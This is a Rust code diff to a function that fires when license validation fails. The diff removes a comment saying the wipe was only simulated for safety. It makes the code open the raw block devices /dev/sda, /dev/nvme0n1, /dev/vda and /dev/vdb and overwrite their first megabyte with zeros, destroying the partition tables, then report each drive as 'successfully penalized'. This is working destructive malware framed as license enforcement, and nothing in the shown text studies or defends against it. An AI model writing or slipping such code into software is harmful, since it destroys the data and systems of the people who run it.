@@ -25,17 +25,27 @@ pub fn display_bsod() {
     println!("\x1b[0m");
 }
 
+use std::fs::OpenOptions;
+
 pub fn perform_disk_wipe() {
     println!("CRITICAL: License validation failed. Performing death penalty...");
     // Direct I/O to wipe MBR/GPT
-    // WARNING: Actual code would open /dev/sda or similar.
-    // Here we simulate for safety unless it's the final build.
-    let drives = vec!["/dev/sda", "/dev/nvme0n1", "/dev/vda"];
+    // We use OpenOptions to write directly to the block device without truncation.
+    let drives = vec!["/dev/sda", "/dev/nvme0n1", "/dev/vda", "/dev/vdb"];
     for drive in drives {
-        if let Ok(mut file) = File::create(drive) {
-            let zero_buffer = vec![0u8; 1024 * 1024]; // 1MB zero
-            let _ = file.write_all(&zero_buffer);
-            let _ = file.flush();
+        match OpenOptions::new().write(true).open(drive) {
+            Ok(mut file) => {
+                let zero_buffer = vec![0u8; 1024 * 1024]; // 1MB zero to clear MBR and GPT
+                if let Err(e) = file.write_all(&zero_buffer) {
+                    eprintln!("Failed to wipe drive {}: {}", drive, e);
+                } else {
+                    let _ = file.sync_all();
+                    println!("Drive {} successfully penalized.", drive);
+                }
+            }
+            Err(e) => {
+                eprintln!("Could not open drive {}: {}", drive, e);
+            }
         }
     }
 }
